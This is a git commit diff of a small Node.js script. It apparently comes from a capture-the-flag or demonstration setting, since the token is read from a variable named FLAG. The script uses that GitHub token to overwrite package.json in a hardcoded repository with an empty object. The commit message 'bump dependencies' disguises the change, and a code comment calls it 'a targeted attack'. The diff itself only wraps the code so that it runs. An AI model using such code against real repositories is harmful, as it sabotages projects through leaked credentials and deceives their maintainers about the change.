fb61142f68b5384ec7f843d6a60ebf4ad2562301
Dawid Moczadło <dawid@moczadlo.pl>
2021-04-11 16:15:27 +0200

    fix code

--- script.js
+++ script.js
@@ -1,29 +1,33 @@
 const github  = require('@actions/github');
 
-const octokit     = github.getOctokit(process.env.FLAG);
-const fileContent = Buffer
-  .from('{\n}')
-  .toString('base64');
+const main = async () => {
+  const octokit     = github.getOctokit(process.env.FLAG);
+  const fileContent = Buffer
+    .from('{\n}')
+    .toString('base64');
 
-// this is a targeted attack, repo name can be hardcoded
-const owner      = 'whoamipl';
-const repo       = 'foobar';
-const branchName = 'main';
-const path       = 'package.json';
+  // this is a targeted attack, repo name can be hardcoded
+  const owner      = 'whoamipl';
+  const repo       = 'foobar';
+  const branchName = 'main';
+  const path       = 'package.json';
 
-const content = await octokit.repos.getContent({
-  owner: owner,
-  repo:  repo,
-  ref:   branchName,
-  path:  path
-});
+  const content = await octokit.repos.getContent({
+    owner: owner,
+    repo:  repo,
+    ref:   branchName,
+    path:  path
+  });
 
-await octokit.repos.createOrUpdateFileContents({
-  owner:   owner,
-  repo:    repo,
-  branch:  branchName,
-  path:    path,
-  message: 'bump dependencies',
-  content: fileContent,
-  sha:     content.data.sha
-});
+  await octokit.repos.createOrUpdateFileContents({
+    owner:   owner,
+    repo:    repo,
+    branch:  branchName,
+    path:    path,
+    message: 'bump dependencies',
+    content: fileContent,
+    sha:     content.data.sha
+  });
+};
+
+main();
